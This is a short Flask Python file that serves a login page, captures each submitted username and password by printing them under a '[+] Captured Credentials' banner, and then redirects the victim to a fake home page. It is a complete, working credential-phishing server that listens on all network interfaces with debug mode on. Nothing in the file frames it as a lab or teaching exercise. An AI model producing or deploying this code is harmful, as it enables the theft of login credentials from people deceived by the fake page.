from flask import Flask, render_template, request, redirect

# Initialize Flask app
app = Flask(__name__)

# Route for login page
@app.route('/')
def login():
    return render_template('login.html')

# Route to handle login form submission
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    # Print credentials in the terminal
    print(f"[+] Captured Credentials -> Username: {username}, Password: {password}")

    # Redirect to a fake home page
    return redirect('/home')

# Route for home page
@app.route('/home')
def home():
    return render_template('home.html')

# Run the app
if __name__ == '__main__':
    # 0.0.0.0 allows access from other devices in the LAN if needed
    app.run(host='0.0.0.0', port=5000, debug=True)

